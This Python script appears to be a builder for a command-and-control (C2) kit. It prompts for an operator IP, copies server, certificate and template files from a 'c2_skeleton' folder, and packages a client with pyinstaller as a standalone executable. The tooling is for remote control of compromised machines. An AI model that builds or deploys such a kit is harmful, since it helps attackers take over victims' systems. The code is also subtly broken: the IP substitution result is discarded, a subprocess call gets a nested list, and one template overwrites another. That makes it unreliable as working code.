import subprocess, os

def setup(_file, folder, new_file):
    with open(_file, 'r') as fl:
        base_file = fl.read()

    if folder:
        try:
            os.mkdir(folder)
        except:
            pass
        with open(f'./{folder}/{new_file}', 'w') as fl:
            fl.write(base_file)
    else:
        with open(f'./{new_file}', 'w') as fl:
            fl.write(base_file)

def setup_ex(_file, folder=None, new_file=None, str_for_repl=None, to_replace=None):
    with open(_file, 'r') as fl:
        base_file = fl.read()

    base_file.replace(str_for_repl,to_replace)

    if folder:
        try:
            os.mkdir(folder)
        except:
            pass
        with open(f'./{folder}/{new_file}', 'w') as fl:
            fl.write(base_file)
    else:
        with open(f'./{new_file}', 'w') as fl:
            fl.write(base_file)

def main(args):
    print(subprocess.run(['pip install -r requirements.txt'.split()], capture_output=True))
    #SETUP TEMPLATES
    print("Setup server prerequirements")
    setup('./c2_skeleton/templates/base.txt', 'templates', 'base.html')
    setup_ex('./c2_skeleton/templates/index.txt', 'templates', 'index.html', '###CHANGE_FOR_IP###',args['ip'])
    setup_ex('./c2_skeleton/templates/result.txt', 'templates', 'base.html', '###CHANGE_FOR_IP###',args['ip'])
    setup('./c2_skeleton/static/index.txt', 'static', 'index.css')
    setup('./c2_skeleton/static/style.txt', 'static', 'style.css')
    #SETUP SERVER FILE
    print("Setup server")
    setup('./c2_skeleton/cert.pem',None, 'cert.pem')
    setup('./c2_skeleton/key.pem',None, 'key.pem')
    setup('./c2_skeleton/db.txt',None, 'db.py')
    setup('./c2_skeleton/server.txt',None, 'server.py')
    #SETUP CLIENT
    print("Setup client...")
    setup_ex('./c2_skeleton/client.txt', None, 'client.py', '###CHANGE_FOR_IP###', args['ip'])
    print(subprocess.run('pyinstaller --onefile client.py'.split(),capture_output=True))

if __name__ =="__main__":
    ip = input("Enter ip address ")
    main({"ip":ip})